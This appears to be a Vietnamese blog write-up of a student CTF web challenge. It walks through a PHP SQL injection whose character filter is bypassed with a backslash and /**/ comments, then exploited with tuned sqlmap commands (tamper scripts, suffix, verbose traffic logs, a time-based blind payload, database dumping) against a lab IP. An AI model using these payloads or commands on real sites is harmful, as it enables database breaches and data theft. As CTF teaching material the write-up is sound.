<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF | minhtuanact | Blog</title>

<meta name="keywords" content="" />
<meta name="description" content="Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài &lt;?php include &#34;config.php&#34;; function check_input($input) { $charset = &#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;\()*&#43;,-./:;&lt;=&gt;?@[]^_`{|}&#34;; if (empty($input)) return false; for ($i = 0 ; $i &lt; strlen($input); $i&#43;&#43;) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[&#34;search_user_exist&#34;])) { $username = $_POST[&#34;username&#34;]; $name = $_POST[&#34;name&#34;]; &#34;hl_lines=5-6&#34; if ( check_input($username) === false || check_input($name) === false) { die(&#34;h4x0r detected&#34;); } $sql = &#34;SELECT id FROM users WHERE username=&#39;$username&#39; or name=&#39;$name&#39;&#34;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) { die(&#34;User exist&#34;); } die(&#34;No user&#34;); } else { highlight_file(__FILE__); } ?">
<meta name="author" content="minhtuanact">
<link rel="canonical" href="https://minhtuanact.github.io/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/" />
<link href="/assets/css/stylesheet.min.d85457619e67d31b97f40ed67c71b5efe0b52508ba759e5a9da0760afd6707db.css" integrity="sha256-2FRXYZ5n0xuX9A7WfHG17&#43;C1JQi6dZ5anaB2Cv1nB9s=" rel="preload stylesheet"
    as="style">

<link rel="icon" href="https://minhtuanact.github.io/favicon.ico">
<link rel="icon" type="image/png" sizes="16x16" href="https://minhtuanact.github.io/favicon-16x16.png">
<link rel="icon" type="image/png" sizes="32x32" href="https://minhtuanact.github.io/favicon-32x32.png">
<link rel="apple-touch-icon" href="https://minhtuanact.github.io/apple-touch-icon.png">
<link rel="mask-icon" href="https://minhtuanact.github.io/safari-pinned-tab.svg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<meta name="generator" content="Hugo 0.82.0" />


<meta property="og:title" content="Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF" />
<meta property="og:description" content="Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài &lt;?php include &#34;config.php&#34;; function check_input($input) { $charset = &#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;\()*&#43;,-./:;&lt;=&gt;?@[]^_`{|}&#34;; if (empty($input)) return false; for ($i = 0 ; $i &lt; strlen($input); $i&#43;&#43;) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[&#34;search_user_exist&#34;])) { $username = $_POST[&#34;username&#34;]; $name = $_POST[&#34;name&#34;]; &#34;hl_lines=5-6&#34; if ( check_input($username) === false || check_input($name) === false) { die(&#34;h4x0r detected&#34;); } $sql = &#34;SELECT id FROM users WHERE username=&#39;$username&#39; or name=&#39;$name&#39;&#34;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) { die(&#34;User exist&#34;); } die(&#34;No user&#34;); } else { highlight_file(__FILE__); } ?" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://minhtuanact.github.io/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/" /><meta property="og:image" content="https://minhtuanact.github.io/papermod-cover.png"/><meta property="article:section" content="post" />
<meta property="article:published_time" content="2019-08-29T14:18:35&#43;07:00" />
<meta property="article:modified_time" content="2019-08-29T14:18:35&#43;07:00" />

<meta name="twitter:card" content="summary_large_image"/>
<meta name="twitter:image" content="https://minhtuanact.github.io/papermod-cover.png"/>

<meta name="twitter:title" content="Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF"/>
<meta name="twitter:description" content="Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài &lt;?php include &#34;config.php&#34;; function check_input($input) { $charset = &#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;\()*&#43;,-./:;&lt;=&gt;?@[]^_`{|}&#34;; if (empty($input)) return false; for ($i = 0 ; $i &lt; strlen($input); $i&#43;&#43;) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[&#34;search_user_exist&#34;])) { $username = $_POST[&#34;username&#34;]; $name = $_POST[&#34;name&#34;]; &#34;hl_lines=5-6&#34; if ( check_input($username) === false || check_input($name) === false) { die(&#34;h4x0r detected&#34;); } $sql = &#34;SELECT id FROM users WHERE username=&#39;$username&#39; or name=&#39;$name&#39;&#34;; $result = $conn-&gt;query($sql); if ($result-&gt;num_rows &gt; 0) { die(&#34;User exist&#34;); } die(&#34;No user&#34;); } else { highlight_file(__FILE__); } ?"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Posts",
      "item": "https://minhtuanact.github.io/post/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF",
      "item": "https://minhtuanact.github.io/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF",
  "name": "Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF",
  "description": "Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài \u0026lt;?php include \u0026#34;config.php\u0026#34;; function check_input($input) { $charset = \u0026#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026amp;\\()*+,-./:;\u0026lt;=\u0026gt;?@[]^_`{|}\u0026#34;; if (empty($input)) return false; for ($i = 0 ; $i \u0026lt; strlen($input); $i++) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[\u0026#34;search_user_exist\u0026#34;])) { $username = $_POST[\u0026#34;username\u0026#34;]; $name = $_POST[\u0026#34;name\u0026#34;]; \u0026#34;hl_lines=5-6\u0026#34; if ( check_input($username) === false || check_input($name) === false) { die(\u0026#34;h4x0r detected\u0026#34;); } $sql = \u0026#34;SELECT id FROM users WHERE username=\u0026#39;$username\u0026#39; or name=\u0026#39;$name\u0026#39;\u0026#34;; $result = $conn-\u0026gt;query($sql); if ($result-\u0026gt;num_rows \u0026gt; 0) { die(\u0026#34;User exist\u0026#34;); } die(\u0026#34;No user\u0026#34;); } else { highlight_file(__FILE__); } ?",
  "keywords": [
    
  ],
  "articleBody": "Mở đầu  Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection  Đề bài php include \"config.php\"; function check_input($input) { $charset = \"~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026\\()*+,-./:;?@[]^_`{|}\"; if (empty($input)) return false; for ($i = 0 ; $i  strlen($input); $i++) if(!strpos($charset,$input[$i])) return false; return true; } if(isset($_POST[\"search_user_exist\"])) { $username = $_POST[\"username\"]; $name = $_POST[\"name\"]; \"hl_lines=5-6\" if ( check_input($username) === false || check_input($name) === false) { die(\"h4x0r detected\"); } $sql = \"SELECT id FROM users WHERE username='$username' or name='$name'\"; $result = $conn-query($sql); if ($result-num_rows  0) { die(\"User exist\"); } die(\"No user\"); } else { highlight_file(__FILE__); } ? (Đề bài đã được custom 1 chút so với đề của KMA CTF)\nXác định cách thức tấn công   Đọc code ta có thể thấy được có 1 chức năng search_user_exist dùng để search xem đã tồn tại username hay name hay chưa. Nhưng để ý đoạn câu lệnh querry thì chắc chắn chỗ này dính sql injection. Nhưng làm thế nào để khai thác, mình phải vượt qua được đoạn function check_input kia đã.\n  Theo function check_input thì chỉ cho phép $charset = \"~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%\u0026\\()*+,-./:;?@[]^_`{|}\";  Vậy là chương trình chặn ký tự ', space, và chặn cả ~.\nVậy tại sao chặn cả dấu ~, mình thấy nó trong charset mà :-?\nLí giải cho điều này vì hàm strpos($charset,$input[$i]); nó sẽ tìm vị trí xuất hiện đầu tiên của $input[$i] trong charset. Do ~ đứng đầu chuỗi charset. Vậy khi tìm dấu ~, nó sẽ trả về giá trị 0. Và trong lệnh if thì if(!0) = true. Vậy nó vô tình lọc cả ký tự ~.\n  Xác định được các ký tự nào được phép qua thì mình bypass qua câu lệnh query này thôi. Sau một hồi tìm hiểu thì trong SQL dấu ' được thay bằng dấu \\, dấu space được thay bằng /**/. Vậy muốn bypass được câu lệnh luôn đúng thì như thế nào:\nSELECT id FROM users WHERE username='\\' or name='OR/**/1=1#'  Nó tương đương với câu lệnh\nSELECT id FROM users WHERE username=''' or name='OR 1=1 Sẽ trả về mệnh đề luôn đúng.\n  Ta đã xác định được username=\\, name=OR/**/1=1#\n  Sử dụng sqlmap   Vậy bây giờ ta sẽ tấn công như thế nào. Đây là Blind SQL Injection. Khi câu lệnh query đúng thì nó sẽ trả về User exist. Khi câu lệnh sai nó trả về No user. Khi có ký tự k thuộc charset nó trả về h4x0r detected.\n  Đầu tiên ta sẽ truyền data cho sqlmap để sqlmap hiểu được\nCâu lệnh:\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=OR/**/1=1#\"   sqlmap báo lỗi k thể injection được. Vậy phải giải quyết như thế nào.\n  Do đây là Blind SQL Injection nên sqlmap sẽ không biết được đâu là câu lệnh query đúng, đâu là câu lệnh query sai, nên sqlmap không tìm được gì. Sử dụng câu lệnh --string để xác định 1 phần văn bản trả về là đúng. Tức là responce trả về có đoạn văn bản giống như vậy thì sqlmap sẽ hiểu câu lệnh đó đang đúng.\nCâu lệnh:\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=OR/**/1=1#\" --string=\"User exist\"   Vẫn k được, trong sqlmap có option -v để xem được chi tiết các payload sử dụng, request như thế nào, kết quả responce ra làm sao. Ở đây mình sẽ dùng cấp độ thứ 6 để kiểm tra kết quả mà sqlmap đẩy lên đúng chưa.\nCâu lệnh:\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=OR/**/1=1#\" --string=\"User exist\" -v 6 [16:50:19] [PAYLOAD] OR/**/1=1#' AND 3190=DBMS_PIPE.RECEIVE_MESSAGE(CHR(69)||CHR(76)||CHR(103)||CHR(77),5) AND 'gzMg'='gzMg [16:50:19] [TRAFFIC OUT] HTTP request [#148]: POST /test/index.php HTTP/1.1 Host: 192.168.19.89 Accept-encoding: gzip,deflate Cache-control: no-cache Content-type: application/x-www-form-urlencoded; charset=utf-8 Accept: */* User-agent: sqlmap/1.3.7#stable (http://sqlmap.org) Content-length: 204 Connection: close search_user_exist\u0026username=%5C\u0026name=OR%2F%2A%2A%2F1%3D1%23%27%20AND%203190%3DDBMS_PIPE.RECEIVE_MESSAGE%28CHR%2869%29%7C%7CCHR%2876%29%7C%7CCHR%28103%29%7C%7CCHR%2877%29%2C5%29%20AND%20%27gzMg%27%3D%27gzMg [16:50:19] [TRAFFIC IN] HTTP response [#148] (200 OK): Date: Wed, 28 Aug 2019 09:50:19 GMT Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1c PHP/7.3.6 X-Powered-By: PHP/7.3.6 Content-Length: 14 Connection: close Content-Type: text/html; charset=UTF-8 URI: http://192.168.19.89:80/test/index.php h4x0r detected   Theo quan sát thì PAYLOAD đang sai, sqlmap sử dụng cả OR/**/1=1# của name nên nó bị sai, và space đang được sử dụng. Bây giờ mình phải chuyển tất cả space về /**/. Ở sqlmap có 1 tùy chọn rất hay là tamper. Để hiển thị danh sách các tamper có trong sqlmap thì sử dụng câu lệnhluôn. Mình hoàn toàn có thể custom lại tamper này của sqlmap.\nsqlmap --list-tampers   Thấy có * space2comment.py - Replaces space character (' ') with comments '/**/' nên sử dụng luôn. Vậy câu lệnh tiếp theo sẽ là:\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=OR/**/1=1#\" -p name --string=\"User exist\" --tamper=space2comment.py   Kiểm tra kết quả thì vẫn chưa được. Câu lệnh query vẫn đang sai. Do sqlmap nối luôn OR/**/1=1# vào payload nên đang bị sai. Chúng ta xóa nó đi và tiến hành chạy lại.\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=OR/**/1=1#\" -p name --string=\"User exist\" --tamper=space2comment.py   Vẫn chưa được, kiểm tra lại với option -v 6 thì thấy rằng PAYLOAD đang sử dụng dấu comment là dấu --, mình phải đổi dấu -- thành dấu #. Sử dụng tùy chọn --suffix=\"#\" thì cuối mỗi PAYLOAD sẽ là dấu #.\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=OR/**/1=1#\" -p name --string=\"User exist\" --tamper=space2comment.py --suffix=\"#\"` Parameter: name (POST) Type: time-based blind Title: MySQL = 5.0.12 AND time-based blind (query SLEEP) Payload: search_user_exist\u0026username=\\\u0026name= AND (SELECT 1987 FROM (SELECT(SLEEP(5)))ApsW)# --- [17:02:55] [WARNING] changes made by tampering scripts are not included in shown payload content(s) [17:02:55] [INFO] the back-end DBMS is MySQL web application technology: Apache 2.4.39, PHP 7.3.6 back-end DBMS: MySQL = 5.0.12    Đã hoạt động rồi. DB sử dụng MySQL, giờ chúng ta sử dụng lệnh --dump-all lấy tên DB và Table của dữ liệu ta cần lấy.\nsqlmap -u http://192.168.19.89/test/index.php --data \"search_user_exist\u0026username=\\\u0026name=\" -p name --string=\"User exist\" --suffix=\"#\" --tamper=space2comment.py --dbms=mysql -D --dumpall-all   Có thể sử dụng các tùy chọn khác để lấy dữ liệu từ từ như --current-db chọn các dữ liệu mong muốn để lấy ra ngoài. D\n  Kết luận  sqlmap rất mạnh, hầu như có thể tấn công vào bất cứ web nào có dính lỗi SQL Injection. Vài điều lưu ý: Nếu sử dụng sqlmap mà k thấy ra kết quả thì sử dụng option -v để xem PAYLOAD truyền vào đúng ý mình chưa. Kiên trì thì sẽ hái được quả ngọt :D  ",
  "wordCount" : "1036",
  "inLanguage": "en",
  "datePublished": "2019-08-29T14:18:35+07:00",
  "dateModified": "2019-08-29T14:18:35+07:00",
  "author":{
    "@type": "Person",
    "name": "minhtuanact"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://minhtuanact.github.io/post/su-dung-cong-cu-sqlmap-voi-blind-sql-injection-cho-1-bai-ctf/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "minhtuanact | Blog",
    "logo": {
      "@type": "ImageObject",
      "url": "https://minhtuanact.github.io/favicon.ico"
    }
  }
}
</script>





</head>

<body class="" id="top">
<script>
    if (localStorage.getItem("pref-theme") === "dark") {
        document.body.classList.add('dark');
    } else if (localStorage.getItem("pref-theme") === "light") {
        document.body.classList.remove('dark')
    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
        document.body.classList.add('dark');
    }

</script>
<noscript>
    <style type="text/css">
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: #1d1e20;
                --entry: #2e2e33;
                --primary: rgba(255, 255, 255, 0.84);
                --secondary: rgba(255, 255, 255, 0.56);
                --tertiary: rgba(255, 255, 255, 0.16);
                --content: rgba(255, 255, 255, 0.74);
                --hljs-bg: #2e2e33;
                --code-bg: #37383e;
                --border: #333;
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }
    </style>

</noscript>
<header class="header">
    <nav class="nav">
        <div class="logo">
            <a href="https://minhtuanact.github.io/" accesskey="h" title="minhtuanact | Blog (Alt + H)">minhtuanact | Blog</a>
            <span class="logo-switches">
                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
                    </svg>
                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24"
                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
                        stroke-linejoin="round">
                        <circle cx="12" cy="12" r="5"></circle>
                        <line x1="12" y1="1" x2="12" y2="3"></line>
                        <line x1="12" y1="21" x2="12" y2="23"></line>
                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
                        <line x1="1" y1="12" x2="3" y2="12"></line>
                        <line x1="21" y1="12" x2="23" y2="12"></line>
                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
                    </svg>
                </button>
                
                
            </span>
        </div>
        <ul id="menu" onscroll="menu_on_scroll()">
            <li>
                <a href="https://minhtuanact.github.io/archives/" title="Archive">
                    <span>Archive</span>
                </a>
            </li>
            <li>
                <a href="https://minhtuanact.github.io/categories/" title="Categories">
                    <span>Categories</span>
                </a>
            </li>
            <li>
                <a href="https://minhtuanact.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
                    <span>Search</span>
                </a>
            </li>
            <li>
                <a href="https://minhtuanact.github.io/tags/" title="Tags">
                    <span>Tags</span>
                </a>
            </li></ul>
    </nav>
</header>

    <main class="main">

<article class="post-single">
  <header class="post-header">
<div class="breadcrumbs">

    <a href="https://minhtuanact.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://minhtuanact.github.io/post/">Posts</a>
</div>

    <h1 class="post-title">
      Sử Dụng Công Cụ SQLMAP với Blind SQL Injection Cho 1 Bài CTF
    </h1>
    <div class="post-meta">

August 29, 2019&nbsp;·&nbsp;5 min&nbsp;·&nbsp;minhtuanact


</div>
  </header> 

  <div class="toc">
    <details >
      <summary accesskey="c" title="(Alt + C)">
        <div class="details">Table of Contents</div>
      </summary>
      <div class="inner"><ul><li>
        <a href="#m%e1%bb%9f-%c4%91%e1%ba%a7u" aria-label="Mở đầu">Mở đầu</a></li><li>
        <a href="#%c4%91%e1%bb%81-b%c3%a0i" aria-label="Đề bài">Đề bài</a></li><li>
        <a href="#x%c3%a1c-%c4%91%e1%bb%8bnh-c%c3%a1ch-th%e1%bb%a9c-t%e1%ba%a5n-c%c3%b4ng" aria-label="Xác định cách thức tấn công">Xác định cách thức tấn công</a></li><li>
        <a href="#s%e1%bb%ad-d%e1%bb%a5ng-sqlmap" aria-label="Sử dụng sqlmap">Sử dụng sqlmap</a></li><li>
        <a href="#k%e1%ba%bft-lu%e1%ba%adn" aria-label="Kết luận">Kết luận</a></li></ul>
      </div>
    </details>
  </div>
  <div class="post-content">
<h2 id="mở-đầu">Mở đầu<a hidden class="anchor" aria-hidden="true" href="#mở-đầu">#</a></h2>
<ul>
<li>Vừa rồi có 1 cuộc thi KMA CTF dành cho sinh viên. Mình cũng được tiếp xúc với 1 bài Web dính SQL Injection</li>
</ul>
<h2 id="đề-bài">Đề bài<a hidden class="anchor" aria-hidden="true" href="#đề-bài">#</a></h2>
<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> 
    <span style="color:#66d9ef">include</span> <span style="color:#e6db74">&#34;config.php&#34;</span>; 
    <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check_input</span>($input) 
    { 
        $charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#$%&amp;\()*+,-./:;&lt;=&gt;?@[]^_`{|}&#34;</span>; 
        <span style="color:#66d9ef">if</span> (<span style="color:#66d9ef">empty</span>($input)) 
            <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; 
        <span style="color:#66d9ef">for</span> ($i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span> ; $i <span style="color:#f92672">&lt;</span> <span style="color:#a6e22e">strlen</span>($input); $i<span style="color:#f92672">++</span>) 
            <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span><span style="color:#a6e22e">strpos</span>($charset,$input[$i])) 
                <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; 
        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>; 
    } 
    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;search_user_exist&#34;</span>])) 
    { 
        $username <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;username&#34;</span>]; 
        $name <span style="color:#f92672">=</span> $_POST[<span style="color:#e6db74">&#34;name&#34;</span>]; <span style="color:#e6db74">&#34;hl_lines=5-6&#34;</span>
        <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">check_input</span>($username) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span> <span style="color:#f92672">||</span> <span style="color:#a6e22e">check_input</span>($name) <span style="color:#f92672">===</span> <span style="color:#66d9ef">false</span>) 
        { 
            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;h4x0r detected&#34;</span>); 
        } 
        $sql <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT id FROM users WHERE username=&#39;</span><span style="color:#e6db74">$username</span><span style="color:#e6db74">&#39; or name=&#39;</span><span style="color:#e6db74">$name</span><span style="color:#e6db74">&#39;&#34;</span>; 
        $result <span style="color:#f92672">=</span> $conn<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">query</span>($sql); 
        <span style="color:#66d9ef">if</span> ($result<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">num_rows</span> <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) 
        { 
            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;User exist&#34;</span>); 
        } 
        <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;No user&#34;</span>); 
    } 
    <span style="color:#66d9ef">else</span> 
    { 
        <span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>); 
    } 
<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
</span></code></pre></div>
(Đề bài đã được custom 1 chút so với đề của KMA CTF)</p>
<h2 id="xác-định-cách-thức-tấn-công">Xác định cách thức tấn công<a hidden class="anchor" aria-hidden="true" href="#xác-định-cách-thức-tấn-công">#</a></h2>
<ul>
<li>
<p>Đọc code ta có thể thấy được có 1 chức năng <code>search_user_exist</code> dùng để search xem đã tồn tại username hay name hay chưa. Nhưng để ý đoạn câu lệnh querry thì chắc chắn chỗ này dính <code>sql injection</code>. Nhưng làm thế nào để khai thác, mình phải vượt qua được đoạn function <code>check_input</code> kia đã.</p>
</li>
<li>
<p>Theo function <code>check_input</code> thì chỉ cho phép
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">    $charset <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;~0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!#</span>$<span style="color:#e6db74">%&amp;\()*+,-./:;&lt;=&gt;?@[]^_`{|}&#34;</span>; 
    </code></pre></div>
Vậy là chương trình chặn ký tự <code>'</code>, <code>space</code>, và chặn cả <code>~</code>.</p>
<p>Vậy tại sao chặn cả dấu <code>~</code>, mình thấy nó trong charset mà :-?</p>
<p>Lí giải cho điều này vì hàm <code>strpos($charset,$input[$i]);</code> nó sẽ tìm vị trí xuất hiện đầu tiên của <code>$input[$i]</code> trong <code>charset</code>. Do <code>~</code> đứng đầu chuỗi <code>charset</code>. Vậy khi tìm dấu <code>~</code>, nó sẽ trả về giá trị 0. Và trong lệnh <code>if</code> thì <code>if(!0) = true</code>. Vậy nó vô tình lọc cả ký tự <code>~</code>.</p>
</li>
<li>
<p>Xác định được các ký tự nào được phép qua thì mình bypass qua câu lệnh query này thôi. Sau một hồi tìm hiểu thì trong SQL dấu <code>'</code> được thay bằng dấu <code>\</code>, dấu <code>space</code> được thay bằng <code>/**/</code>. Vậy muốn bypass được câu lệnh luôn đúng thì như thế nào:</p>
<p><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">    <span style="color:#66d9ef">SELECT</span> id <span style="color:#66d9ef">FROM</span> users <span style="color:#66d9ef">WHERE</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;\&#39;</span> <span style="color:#66d9ef">or</span> name<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;OR/**/1=1#&#39;</span>
    </code></pre></div>
Nó tương đương với câu lệnh</p>
<pre><code>SELECT id FROM users WHERE username=''' or name='OR 1=1
</code></pre><p>Sẽ trả về mệnh đề luôn đúng.</p>
</li>
<li>
<p>Ta đã xác định được <code>username=\</code>, <code>name=OR/**/1=1#</code></p>
<p><img loading="lazy" src="https://images.viblo.asia/e8c45764-854f-4707-acc1-3a52d4679798.png" alt=""  />
</p>
</li>
</ul>
<h2 id="sử-dụng-sqlmap">Sử dụng sqlmap<a hidden class="anchor" aria-hidden="true" href="#sử-dụng-sqlmap">#</a></h2>
<ul>
<li>
<p>Vậy bây giờ ta sẽ tấn công như thế nào. Đây là Blind SQL Injection. Khi câu lệnh query đúng thì nó sẽ trả về <code>User exist</code>. Khi câu lệnh sai nó trả về <code>No user</code>. Khi có ký tự k thuộc <code>charset</code> nó trả về <code>h4x0r detected</code>.</p>
</li>
<li>
<p>Đầu tiên ta sẽ truyền data cho sqlmap để sqlmap hiểu được</p>
<p>Câu lệnh:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://192.168.19.89/test/index.php --data <span style="color:#e6db74">&#34;search_user_exist&amp;username=\&amp;name=OR/**/1=1#&#34;</span>
</code></pre></div></li>
<li>
<p><code>sqlmap</code> báo lỗi k thể injection được. Vậy phải giải quyết như thế nào.</p>
</li>
<li>
<p>Do đây là Blind SQL Injection nên <code>sqlmap</code> sẽ không biết được đâu là câu lệnh query đúng, đâu là câu lệnh query sai, nên <code>sqlmap</code> không tìm được gì. Sử dụng câu lệnh <code>--string</code> để xác định 1 phần văn bản trả về là đúng. Tức là responce trả về có đoạn văn bản giống như vậy thì <code>sqlmap</code> sẽ hiểu câu lệnh đó đang đúng.</p>
<p>Câu lệnh:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://192.168.19.89/test/index.php --data <span style="color:#e6db74">&#34;search_user_exist&amp;username=\&amp;name=OR/**/1=1#&#34;</span> --string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User exist&#34;</span>
</code></pre></div></li>
<li>
<p>Vẫn k được, trong <code>sqlmap</code> có option <code>-v</code> để xem được chi tiết các payload sử dụng, request như thế nào, kết quả responce ra làm sao. Ở đây mình sẽ dùng cấp độ thứ 6 để kiểm tra kết quả mà <code>sqlmap</code> đẩy lên đúng chưa.</p>
<p>Câu lệnh:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u http://192.168.19.89/test/index.php --data <span style="color:#e6db74">&#34;search_user_exist&amp;username=\&amp;name=OR/**/1=1#&#34;</span> --string<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;User exist&#34;</span> -v <span style="color:#ae81ff">6</span>
</code></pre></div><div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#f92672">[</span>16:50:19<span style="color:#f92672">]</span> <span style="color:#f92672">[</span>PAYLOAD<span style="color:#f92672">]</span> OR/**/1<span style="color:#f92672">=</span>1#<span style="color:#e6db74">&#39; AND 3190=DBMS_PIPE.RECEIVE_MESSAGE(CHR(69)||CHR(76)||CHR(103)||CHR(77),5) AND &#39;</span>gzMg<span style="color:#e6db74">&#39;=&#39;</span>gzMg
